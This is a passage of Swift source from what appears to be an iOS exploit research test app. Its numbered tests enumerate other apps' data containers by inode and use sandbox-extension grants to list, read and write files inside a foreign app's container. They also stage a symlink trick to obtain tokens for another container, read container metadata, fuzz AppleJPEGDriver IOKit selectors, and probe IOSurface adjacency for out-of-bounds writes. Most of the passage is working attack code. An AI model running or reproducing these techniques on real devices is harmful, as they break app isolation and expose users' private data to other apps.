            if handle >= 0 {
                r = access(target, R_OK) == 0
                w = access(target, W_OK) == 0
                entries = listCount(target)
                wq_revoke(handle)
            }
            benchLine("     \(short)")
            benchLine("          exists=\(exists) grant=\(handle)" +
                      (handle >= 0 ? " ?? R=\(r) W=\(w) entries=\(entries)" : ""))
        }

        // And the parent directories, for completeness.
        for parent in ["/private/var/containers/Data/System",
                       "/private/var/mobile/Containers/Data/InternalDaemon",
                       "/private/var/mobile/Containers/Data/PluginKitPlugin",
                       "/private/var/mobile/Containers/Shared/AppGroup"] {
            let handle = grant(parent)
            benchLine("     parent \(parent.replacingOccurrences(of: "/private", with: "")): grant=\(handle)")
            if handle >= 0 { wq_revoke(handle) }
        }

        benchLine("     a positive grant outside SystemGroup widens the finding")
        benchLine("??? done")
    }

    // MARK: - test 78: write inside another app's container

    /// Test 77 reported a grant with W=true on another application's data
    /// container. This proves it: list the container, read a file, create and
    /// remove a probe file there.
    func bench78ForeignContainer() {
        benchLine("??? 78 ?? write inside another app's container")

        guard let group = firstUsableGroup() else { benchLine("[NO] App Group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let mine = NSHomeDirectory()

        // Find a container that is not ours.
        let parent = "/private/var/mobile/Containers/Data/Application"
        var st = statfs()
        guard statfs(parent, &st) == 0 else { benchLine("[NO] statfs"); return }
        var buf = [CChar](repeating: 0, count: 1024)
        var target: String?
        let prefix = parent + "/"
        for inode in UInt64(1)...UInt64(250_000) {
            var fs = st.f_fsid
            let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buf)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            guard !rest.contains("/") else { continue }
            if mine.contains(String(rest)) { continue }
            target = p
            break
        }
        guard let path = target else { benchLine("[NO] no foreign container"); return }
        benchLine("     target: \(path.replacingOccurrences(of: "/private", with: ""))")

        let handle = path.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        // List it.
        var entries: [String] = []
        if let d = opendir(path) {
            while let e = readdir(d) {
                let name = withUnsafeBytes(of: e.pointee.d_name) { raw -> String in
                    String(decoding: raw.prefix { $0 != 0 }, as: UTF8.self)
                }
                if name != "." && name != ".." { entries.append(name) }
            }
            closedir(d)
        }
        benchLine("     entries: \(entries.count) ?? \(entries.prefix(6).joined(separator: ", "))")

        // Read one of its files, if any.
        if let name = entries.first(where: { $0 != "Documents" && $0 != "Library" && $0 != "tmp" && $0 != "SystemData" }) {
            let full = (path as NSString).appendingPathComponent(name)
            if let data = FileManager.default.contents(atPath: full) {
                benchLine("     read \(name): \(data.count) bytes")
            }
        }

        // Create, verify, remove.
        let probe = (path as NSString).appendingPathComponent("bench27-probe.txt")
        let payload = Data("bench27 wrote here".utf8)
        let created = FileManager.default.createFile(atPath: probe, contents: payload)
        var readBack = 0
        if created, let back = FileManager.default.contents(atPath: probe) { readBack = back.count }
        let removed = created ? (try? FileManager.default.removeItem(atPath: probe)) != nil : false
        benchLine("     file create: \(created) ?? read back \(readBack) bytes ?? removed: \(removed)")

        // And a directory, the stronger form.
        let dirProbe = (path as NSString).appendingPathComponent("bench27-dir")
        let madeDir = (try? FileManager.default.createDirectory(atPath: dirProbe,
                                                               withIntermediateDirectories: false)) != nil
        let removedDir = madeDir ? (try? FileManager.default.removeItem(atPath: dirProbe)) != nil : false
        benchLine("     directory create: \(madeDir) ?? removed: \(removedDir)")

        benchLine(created && removed
                  ? "[OK] writing inside another app's container works"
                  : "[NO] the grant does not extend to writes here")
        benchLine("??? done")
    }

    // MARK: - test 79: which container classes issue a token

    /// KAMUI documents several classes: 7 (app group), 2 (app container),
    /// 13 (legacy traversal) and 12 (built-in). This asks each of them for a
    /// token, with and without an App Group, and reports what is granted.
    func bench79ContainerClasses() {
        benchLine("??? 79 ?? which container classes issue a token")

        let group = firstUsableGroup() ?? "group.b14c62c03230f578.1"
        let bundle = Bundle.main.bundleIdentifier ?? "app.orangutan4993.maroon9471"
        benchLine("     group: \(group) ?? bundle: \(bundle)")

        let flags: [(String, UInt64)] = [
            ("0x8000000000", 0x0000_0080_0000_0000),
            ("0x8100000000", 0x0000_0081_0000_0000),
        ]
        let classes: [(UInt64, String, String)] = [
            (7, "app group", group),
            (2, "app container", bundle),
            (13, "legacy traversal", bundle),
            (12, "built-in", bundle),
        ]
        let parts: [(UInt64, String)] = [(3, "Library/Caches"), (2, "Library/Preferences")]

        var wins: [String] = []

        for (cls, name, ident) in classes {
            for (partNo, partName) in parts {
                for (flagName, flagValue) in flags {
                    for domain in ["", "SystemDataDomain"] {
                        let handle = ident.withCString { i in
                            domain.withCString { d in
                                wq_token(i, cls, partNo, flagValue, d)
                            }
                        }
                        if handle >= 0 {
                            let line = "class \(cls) \(name) ?? part \(partNo) \(partName) ?? \(flagName)"
                                + (domain.isEmpty ? "" : " ?? domain \(domain)")
                            wins.append(line)
                            benchLine("     \(line) ??? handle \(handle)")
                            wq_revoke(handle)
                        }
                    }
                }
            }
        }

        benchLine("     granted combinations: \(wins.count)")
        if wins.isEmpty {
            benchLine("[NO] no class issued a token in this configuration")
        } else {
            benchLine("[OK] the classes above issue tokens on this build")
        }
        benchLine("??? done")
    }

    // MARK: - test 80: use whatever class worked

    /// Takes the first class that answered in test 79 and tries to list a foreign
    /// application container through it, so the reach can be compared with class 7.
    func bench80ClassReach() {
        benchLine("??? 80 ?? reach of the working class")

        let bundle = Bundle.main.bundleIdentifier ?? "app.orangutan4993.maroon9471"
        let group = firstUsableGroup() ?? "group.b14c62c03230f578.1"

        // A foreign container, resolved by inode.
        let parent = "/private/var/mobile/Containers/Data/Application"
        var st = statfs()
        guard statfs(parent, &st) == 0 else { benchLine("[NO] statfs"); return }
        var buf = [CChar](repeating: 0, count: 1024)
        var foreign: String?
        let prefix = parent + "/"
        let mine = NSHomeDirectory()
        for inode in UInt64(1)...UInt64(250_000) {
            var fs = st.f_fsid
            let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buf)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            guard !rest.contains("/"), !mine.contains(String(rest)) else { continue }
            foreign = p
            break
        }
        guard let target = foreign else { benchLine("[NO] no foreign container"); return }
        benchLine("     target: \(target.replacingOccurrences(of: "/private", with: ""))")

        let classes: [(UInt64, String, String)] = [
            (7, "app group", group),
            (2, "app container", bundle),
            (13, "legacy", bundle),
        ]
        for (cls, name, ident) in classes {
            let handle = ident.withCString { i in wq_token(i, cls, 3, 0x0000_0081_0000_0000, "") }
            guard handle >= 0 else {
                benchLine("     class \(cls) \(name): no token (\(handle))")
                continue
            }
            var entries = 0
            if let d = opendir(target) {
                while let e = readdir(d) { if e.pointee.d_name.0 != 46 { entries += 1 } }
                closedir(d)
            }
            let w = access(target, W_OK) == 0
            benchLine("     class \(cls) \(name): handle \(handle) ?? entries \(entries) ?? W=\(w)")
            wq_revoke(handle)
        }
        benchLine("??? done")
    }

    // MARK: - test 81: the class-2 parent fallback

    /// KAMUI documents a fallback that needs no App Group: rename the app's own
    /// Library, rebuild it, and put a symlink at Library/Caches so class 2 hands
    /// out a token for the target. This measures whether the sandbox allows the
    /// rename at all, then tries the sequence and restores everything.
    func bench81ClassTwoFallback() {
        benchLine("??? 81 ?? class-2 parent fallback")

        let home = NSHomeDirectory()
        let library = home + "/Library"
        let backup = home + "/Library.b27"

        // 1. Can we rename Library at all?
        let renamed = rename(library, backup)
        let renameErrno = errno
        if renamed != 0 {
            benchLine("     rename Library ??? \(errnoName(renameErrno)) ??? fallback impossible")
            benchLine("[NO] the sandbox forbids it; an App Group stays required")
            benchLine("??? done")
            return
        }
        benchLine("     rename Library: ok")

        // From here on everything must be undone.
        var restored = false
        defer {
            if !restored {
                remove(library)
                _ = rename(backup, library)
            }
        }

        // 2. Rebuild Library and plant the symlink.
        guard mkdir(library, 0o755) == 0 else {
            benchLine("     mkdir Library failed (\(errnoName(errno)))")
            benchLine("[NO] cannot stage the fallback")
            benchLine("??? done")
            return
        }

        // A target outside our container.
        let parent = "/private/var/mobile/Containers/Data/Application"
        var st = statfs()
        var target: String?
        if statfs(parent, &st) == 0 {
            var buf = [CChar](repeating: 0, count: 1024)
            let prefix = parent + "/"
            let mine = home
            for inode in UInt64(1)...UInt64(250_000) {
                var fs = st.f_fsid
                let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                    withUnsafePointer(to: &fs) { fp in
                        xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                    }
                }
                if n <= 0 { continue }
                let p = String(cString: buf)
                guard p.hasPrefix(prefix) else { continue }
                let rest = p.dropFirst(prefix.count)
                guard !rest.contains("/"), !mine.contains(String(rest)) else { continue }
                target = p
                break
            }
        }
        guard let dest = target else {
            benchLine("[NO] no foreign container to point at")
            benchLine("??? done")
            return
        }
        benchLine("     target: \(dest.replacingOccurrences(of: "/private", with: ""))")

        let link = library + "/Caches"
        guard symlink(dest, link) == 0 else {
            benchLine("     symlink failed (\(errnoName(errno)))")
            benchLine("??? done")
            return
        }
        benchLine("     symlink staged at Library/Caches")

        // 3. Ask class 2 for the app container.
        let bundle = Bundle.main.bundleIdentifier ?? "app.orangutan4993.maroon9471"
        for (flagName, flagValue) in [("0x8100000000", UInt64(0x0000_0081_0000_0000)),
                                      ("0x8000000000", UInt64(0x0000_0080_0000_0000))] {
            let handle = bundle.withCString { b in wq_token(b, 2, 3, flagValue, "") }
            var entries = 0
            var w = false
            if handle >= 0 {
                if let d = opendir(dest) {
                    while let e = readdir(d) { if e.pointee.d_name.0 != 46 { entries += 1 } }
                    closedir(d)
                }
                w = access(dest, W_OK) == 0
                wq_revoke(handle)
            }
            benchLine("     class 2 ?? \(flagName): handle \(handle) ?? entries \(entries) ?? W=\(w)")
        }

        // 4. Undo.
        restored = true
        unlink(link)
        _ = rmdir(library)
        let back = rename(backup, library)
        benchLine("     restore Library: \(back == 0 ? "ok" : errnoName(errno))")
        benchLine("??? done")
    }

    private func errnoName(_ code: Int32) -> String {
        switch code {
        case 1: return "EPERM"
        case 2: return "ENOENT"
        case 13: return "EACCES"
        case 17: return "EEXIST"
        case 20: return "ENOTDIR"
        case 30: return "EROFS"
        default: return "errno \(code)"
        }
    }

    // MARK: - test 82: JPEG driver with the documented dispatch table

    /// The dispatch table of AppleJPEGDriver checks the structure input **and**
    /// output size exactly. Every earlier sweep passed a fixed 0x400 output, which
    /// is why nothing was accepted. This uses the documented pairs.
    func bench82JPEGDispatch() {
        benchLine("??? 82 ?? JPEG driver with the documented table")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        // selector, structIn, structOut ??? from the decoded table.
        let table: [(UInt32, Int, Int)] = [
            (0, 0, 0), (1, 0x58, 0x58), (2, 0, 0), (3, 0x58, 0x58),
            (4, 0x1000, 0x1000), (5, 0x1000, 0x1000),
            (6, 0xda0, 0xda0), (7, 0xda0, 0xda0),
            (8, 0x4, 0), (9, 0, 0),
        ]

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870160: return "NotReady"
            case -536870211: return "NoMemory"
            default: return "kr=\(kr)"
            }
        }

        var accepted = 0
        for type in UInt32(0)...3 {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, type, &conn) == KERN_SUCCESS else { continue }
            defer { xq_IOServiceClose(conn) }

            for (sel, inSize, outSize) in table {
                var input = [UInt8](repeating: 0, count: max(inSize, 1))
                var out = [UInt8](repeating: 0, count: max(outSize, 1))
                var outCnt = outSize
                var scount: UInt32 = 0
                var sOut = [UInt64](repeating: 0, count: 4)
                var kr: kern_return_t = -1
                input.withUnsafeBytes { ib in
                    out.withUnsafeMutableBytes { ob in
                        sOut.withUnsafeMutableBufferPointer { sop in
                            kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                        inSize > 0 ? ib.baseAddress : nil, inSize,
                                                        sop.baseAddress, &scount,
                                                        outSize > 0 ? ob.baseAddress : nil, &outCnt)
                        }
                    }
                }
                if kr != -536870206 {
                    accepted += 1
                    benchLine("     type \(type) sel \(sel) in 0x\(String(inSize, radix: 16)) out 0x\(String(outSize, radix: 16)) ??? \(name(kr))")
                }
                _ = out
            }
        }

        benchLine("     answers other than BadArgument: \(accepted)")
        if accepted > 0 {
            benchLine("[OK] the table is right ??? the driver is now reachable with its own shapes")
        } else {
            benchLine("[NO] still rejected; the table may differ on this build")
        }
        benchLine("??? done")
    }

    // MARK: - test 83: find the fields the JPEG driver reads

    /// Test 82 proved the sizes are right and the handler runs. All-zero input
    /// still fails, so the structure needs real values. This puts a surface id and
    /// some sizes at each offset and reports any answer that changes.
    func bench83JPEGFields() {
        benchLine("??? 83 ?? which fields the JPEG driver reads")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        // A real surface to point at.
        guard let made = benchMakeSurface(headerPerSlice: 0) else {
            benchLine("[NO] surface"); return
        }
        let (surfaceID, surface) = made
        benchLine("     surface id=\(surfaceID) alloc=0x\(String(IOSurfaceGetAllocSize(surface), radix: 16))")

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870196: return "NotWritable(0x2CC)"
            case -536870212: return "Error(0x2BC)"
            case -536870201: return "Unsupported"
            case -536870207: return "NotPrivileged"
            case -536870211: return "NoMemory"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func call(_ conn: io_connect_t, _ sel: UInt32, input: [UInt8], outSize: Int) -> kern_return_t {
            var buf = input
            var out = [UInt8](repeating: 0, count: max(outSize, 1))
            var outCnt = outSize
            var scount: UInt32 = 0
            var sOut = [UInt64](repeating: 0, count: 4)
            var kr: kern_return_t = -1
            buf.withUnsafeBytes { ib in
                out.withUnsafeMutableBytes { ob in
                    sOut.withUnsafeMutableBufferPointer { sop in
                        kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                    ib.baseAddress, input.count,
                                                    sop.baseAddress, &scount,
                                                    outSize > 0 ? ob.baseAddress : nil, &outCnt)
                    }
                }
            }
            return kr
        }

        func put(_ value: UInt32, at offset: Int, in input: inout [UInt8]) {
            guard offset + 4 <= input.count else { return }
            withUnsafeBytes(of: value.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[offset + i] = b }
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        let jobs: [(String, UInt32, Int, Int)] = [
            ("sel 1", 1, 0x58, 0x58),
            ("sel 4", 4, 0x1000, 0x1000),
        ]
        let values: [(String, UInt32)] = [
            ("surfaceID", surfaceID),
            ("64", 64),
            ("0x1000", 0x1000),
            ("1", 1),
        ]

        for (label, sel, inSize, outSize) in jobs {
            let base = call(conn, sel, input: [UInt8](repeating: 0, count: inSize), outSize: outSize)
            benchLine("     \(label) baseline: \(name(base))")
            var changes: [String] = []

            for offset in stride(from: 0, to: min(inSize, 0x100), by: 4) {
                for (valueName, value) in values {
                    var input = [UInt8](repeating: 0, count: inSize)
                    put(value, at: offset, in: &input)
                    let kr = call(conn, sel, input: input, outSize: outSize)
                    if kr != base {
                        changes.append("0x\(String(offset, radix: 16))=\(valueName) ??? \(name(kr))")
                    }
                }
            }

            benchLine("     \(label) offsets that changed the answer: \(changes.count)")
            for c in changes.prefix(12) { benchLine("          \(c)") }
        }

        _ = surface
        benchLine("     a field that changes the answer is one the handler reads")
        benchLine("??? done")
    }

    // MARK: - test 84: does the JPEG driver need a context first

    /// The handler reads this+0xe0 and bails when it is null, so a call can be
    /// rejected before any field is parsed. Selectors 0 and 2 answer ok with no
    /// arguments ??? this tries them as setup, then the real ones.
    func bench84JPEGSetup() {
        benchLine("??? 84 ?? does the JPEG driver need a context first")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870196: return "NotWritable"
            case -536870212: return "Error"
            case -536870201: return "Unsupported"
            case -536870207: return "NotPrivileged"
            case -536870211: return "NoMemory"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func call(_ conn: io_connect_t, _ sel: UInt32, inSize: Int, outSize: Int) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: max(inSize, 1))
            var out = [UInt8](repeating: 0, count: max(outSize, 1))
            var outCnt = outSize
            var scount: UInt32 = 0
            var sOut = [UInt64](repeating: 0, count: 4)
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                out.withUnsafeMutableBytes { ob in
                    sOut.withUnsafeMutableBufferPointer { sop in
                        kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                    inSize > 0 ? ib.baseAddress : nil, inSize,
                                                    sop.baseAddress, &scount,
                                                    outSize > 0 ? ob.baseAddress : nil, &outCnt)
                    }
                }
            }
            return kr
        }

        let shapes: [(UInt32, Int, Int)] = [
            (0, 0, 0), (2, 0, 0), (1, 0x58, 0x58), (3, 0x58, 0x58),
            (4, 0x1000, 0x1000), (5, 0x1000, 0x1000),
            (6, 0xda0, 0xda0), (7, 0xda0, 0xda0), (8, 0x4, 0), (9, 0, 0),
        ]

        func shape(_ sel: UInt32) -> (Int, Int) {
            let s = shapes.first { $0.0 == sel } ?? (sel, 0, 0)
            return (s.1, s.2)
        }

        // A receive port, in case the driver wants one before working.
        var port: mach_port_t = 0
        mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
        defer { if port != 0 { mach_port_deallocate(mach_task_self_, port) } }

        // Each sequence runs on its own connection.
        let sequences: [(String, [UInt32], Bool)] = [
            ("nothing", [], false),
            ("sel 0", [0], false),
            ("sel 2", [2], false),
            ("sel 0,2", [0, 2], false),
            ("sel 0,2,9", [0, 2, 9], false),
            ("port then sel 0,2", [0, 2], true),
        ]

        for (label, setup, usePort) in sequences {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { continue }
            defer { xq_IOServiceClose(conn) }

            if usePort { _ = xq_IOConnectSetNotificationPort(conn, 0, port, 0) }

            for sel in setup {
                let (i, o) = shape(sel)
                _ = call(conn, sel, inSize: i, outSize: o)
            }

            var parts: [String] = []
            for sel in [1, 3, 4, 5, 6, 7, 8] as [UInt32] {
                let (i, o) = shape(sel)
                parts.append("sel \(sel)=\(name(call(conn, sel, inSize: i, outSize: o)))")
            }
            benchLine("     \(label): \(parts.joined(separator: " ?? "))")
        }

        benchLine("     a setup step that changes the later answers is the context")
        benchLine("??? done")
    }

    // MARK: - test 85: does normal decoding power the JPEG driver

    /// The handler checks this+0xe0 before reading anything, and no sequence of
    /// IOKit calls fills it. The scaler taught the same lesson: a context appears
    /// only after the hardware is used normally. This decodes real JPEGs through
    /// ImageIO and compares the answers before and after.
    func bench85JPEGWarm() {
        benchLine("??? 85 ?? does normal decoding power the JPEG driver")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870196: return "NotWritable"
            case -536870212: return "Error"
            case -536870201: return "Unsupported"
            case -536870207: return "NotPrivileged"
            case -536870211: return "NoMemory"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        let shapes: [(UInt32, Int, Int)] = [
            (1, 0x58, 0x58), (3, 0x58, 0x58), (4, 0x1000, 0x1000),
            (5, 0x1000, 0x1000), (6, 0xda0, 0xda0), (7, 0xda0, 0xda0), (8, 0x4, 0),
        ]

        func probe() -> String {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
                return "open failed"
            }
            defer { xq_IOServiceClose(conn) }

            var parts: [String] = []
            for (sel, inSize, outSize) in shapes {
                var input = [UInt8](repeating: 0, count: max(inSize, 1))
                var out = [UInt8](repeating: 0, count: max(outSize, 1))
                var outCnt = outSize
                var scount: UInt32 = 0
                var sOut = [UInt64](repeating: 0, count: 4)
                var kr: kern_return_t = -1
                input.withUnsafeBytes { ib in
                    out.withUnsafeMutableBytes { ob in
                        sOut.withUnsafeMutableBufferPointer { sop in
                            kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                        ib.baseAddress, inSize,
                                                        sop.baseAddress, &scount,
                                                        outSize > 0 ? ob.baseAddress : nil, &outCnt)
                        }
                    }
                }
                parts.append("\(sel)=\(name(kr))")
            }
            return parts.joined(separator: " ")
        }

        benchLine("     before: \(probe())")

        // Decode real JPEGs. Large ones go through the hardware path.
        var decoded = 0
        for side in [2048, 4096, 8000] {
            let ctx = CGContext(data: nil, width: side, height: side, bitsPerComponent: 8,
                                bytesPerRow: side * 4, space: CGColorSpaceCreateDeviceRGB(),
                                bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)
            guard let ctx else { continue }
            ctx.setFillColor(CGColor(red: 0.3, green: 0.6, blue: 0.9, alpha: 1))
            ctx.fill(CGRect(x: 0, y: 0, width: side, height: side))
            // Some noise so the encoder cannot trivially compress it.
            for i in stride(from: 0, to: side, by: 64) {
                ctx.setFillColor(CGColor(red: 0.9, green: 0.2, blue: 0.1, alpha: 1))
                ctx.fill(CGRect(x: i, y: i, width: 32, height: 32))
            }
            guard let img = ctx.makeImage() else { continue }
            let data = NSMutableData()
            guard let dest = CGImageDestinationCreateWithData(data, "public.jpeg" as CFString, 1, nil)
            else { continue }
            CGImageDestinationAddImage(dest, img, [kCGImageDestinationLossyCompressionQuality: 0.9] as CFDictionary)
            guard CGImageDestinationFinalize(dest) else { continue }

            if let src = CGImageSourceCreateWithData(data as CFData, nil),
               let decodedImage = CGImageSourceCreateImageAtIndex(src, 0, nil) {
                _ = decodedImage
                decoded += 1
                benchLine("     decoded \(side)??\(side) ?? \(data.length) bytes")
            }
        }
        benchLine("     warm-up decodes: \(decoded)/3")

        benchLine("     after:  \(probe())")
        benchLine("     a changed answer means normal decoding powers the driver")
        benchLine("??? done")
    }

    // MARK: - test 86: why the container metadata is unreadable

    /// The file manager shows UUIDs instead of human names, so the metadata read
    /// is failing. This walks three groups and reports, for each: the grant, the
    /// file's presence and size, and the keys the plist actually carries.
    func bench86ContainerMetadata() {
        benchLine("??? 86 ?? container metadata readability")

        guard let group = firstUsableGroup() else { benchLine("[NO] App Group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let root = "/private/var/containers/Shared/SystemGroup"
        let metaName = ".com.apple.mobile_container_manager.metadata.plist"

        var st = statfs()
        guard statfs(root, &st) == 0 else { benchLine("[NO] statfs"); return }
        var buf = [CChar](repeating: 0, count: 1024)
        var dirs: [String] = []
        let prefix = root + "/"
        for inode in UInt64(1)...UInt64(250_000) {
            var fs = st.f_fsid
            let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buf)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            if let first = rest.split(separator: "/").first {
                let dir = prefix + String(first)
                if !dirs.contains(dir) { dirs.append(dir) }
            }
        }
        benchLine("     groups: \(dirs.count)")

        for dir in dirs.prefix(3) {
            let short = dir.replacingOccurrences(of: prefix, with: "")
            let handle = dir.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
            benchLine("     \(short) ?? grant \(handle)")
            guard handle >= 0 else { continue }
            defer { wq_revoke(handle) }

            let meta = (dir as NSString).appendingPathComponent(metaName)
            var sb = stat()
            let exists = stat(meta, &sb) == 0
            benchLine("          metadata exists=\(exists)" + (exists ? " size=\(sb.st_size)" : " errno=\(errno)"))

            if exists, let data = FileManager.default.contents(atPath: meta) {
                benchLine("          read \(data.count) bytes")
                if let any = try? PropertyListSerialization.propertyList(from: data, format: nil),
                   let dict = any as? [String: Any] {
                    benchLine("          keys: \(dict.keys.sorted().joined(separator: ", "))")
                    if let id = dict["MCMMetadataIdentifier"] as? String {
                        benchLine("          MCMMetadataIdentifier = \(id)")
                    }
                }
            } else {
                benchLine("          read failed ?? errno=\(errno)")
            }
        }

        benchLine("??? done")
    }

    // MARK: - test 87: adjacent IOSurface allocations

    /// A published claim says plain 16 KB IOSurfaces land next to each other with
    /// a 0x4000 delta and no guard page, so a write past one reaches the next.
    /// This creates a batch, looks for that delta, and proves the crossing.
    func bench87SurfaceAdjacency() {
        benchLine("??? 87 ?? adjacent IOSurface allocations")

        let side = 64
        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: side, .height: side,
            .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: side * 4,
            .allocSize: side * side * 4,
        ]

        var surfaces: [IOSurfaceRef] = []
        var bases: [UInt] = []
        for _ in 0..<50 {
            guard let s = IOSurfaceCreate(bgra as CFDictionary) else { continue }
            surfaces.append(s)
            bases.append(UInt(bitPattern: IOSurfaceGetBaseAddress(s)))
        }
        defer { _ = surfaces }
        benchLine("     created \(surfaces.count) surfaces ?? alloc 0x\(String(surfaces.first.map { IOSurfaceGetAllocSize($0) } ?? 0, radix: 16))")

        guard surfaces.count > 1 else { benchLine("[NO] no surfaces"); return }

        // Look for a pair with the documented delta.
        var pair: (Int, Int, UInt)?
        for i in 0..<(bases.count - 1) {
            let delta = bases[i + 1] &- bases[i]
            if delta == 0x4000 { pair = (i, i + 1, delta); break }
        }

        if let pair {
            benchLine("     adjacent pair: \(pair.0) ??? \(pair.1) ?? delta 0x\(String(pair.2, radix: 16))")
        } else {
            var deltas: [UInt] = []
            for i in 0..<(bases.count - 1) {
                let d = bases[i + 1] &- bases[i]
                if d < 0x100000 { deltas.append(d) }
            }
            benchLine("     no 0x4000 pair ?? closest deltas: \(deltas.prefix(6).map { "0x" + String($0, radix: 16) }.joined(separator: ", "))")
        }

        // Write past the first surface and read it from the second, when adjacent.
        if let pair {
            let a = surfaces[pair.0], b = surfaces[pair.1]
            let span = Int(IOSurfaceGetAllocSize(a))
            let marker: UInt32 = 0xDEADBEEF

            IOSurfaceLock(a, [], nil)
            let baseA = IOSurfaceGetBaseAddress(a).assumingMemoryBound(to: UInt8.self)
            baseA[span] = 0xAA
            baseA[span + 1] = 0xBB
            baseA[span + 2] = 0xCC
            baseA[span + 3] = 0xDD
            IOSurfaceUnlock(a, [], nil)

            IOSurfaceLock(b, [], nil)
            let baseB = IOSurfaceGetBaseAddress(b).assumingMemoryBound(to: UInt8.self)
            let first = [baseB[0], baseB[1], baseB[2], baseB[3]]
            IOSurfaceUnlock(b, [], nil)

            benchLine("     wrote 4 bytes at A+0x\(String(span, radix: 16)) ?? B head reads \(first.map { String(format: "%02x", $0) }.joined(separator: " "))")
            if first == [0xAA, 0xBB, 0xCC, 0xDD] {
                benchLine("[OK] the surfaces are adjacent and the write crosses into the next one")
            } else {
                benchLine("[NO] adjacent, but the write did not land in the neighbour")
            }
            _ = marker
        }

        benchLine("     adjacency is a mapping detail, not a kernel OOB by itself")
        benchLine("??? done")
    }

    // MARK: - test 88: container metadata inside an app sandbox

    /// Erosion's notes say the container metadata can be read to recover a bundle
    /// id. In SystemGroup that read returns EPERM; this checks an app container.
    func bench88AppContainerMetadata() {
        benchLine("??? 88 ?? metadata inside an app container")

        guard let group = firstUsableGroup() else { benchLine("[NO] App Group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let root = "/private/var/mobile/Containers/Data/Application"
        let metaName = ".com.apple.mobile_container_manager.metadata.plist"

        var st = statfs()
        guard statfs(root, &st) == 0 else { benchLine("[NO] statfs"); return }
        var buf = [CChar](repeating: 0, count: 1024)
        var dirs: [String] = []
        let prefix = root + "/"
        for inode in UInt64(1)...UInt64(250_000) {
            var fs = st.f_fsid
            let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buf)
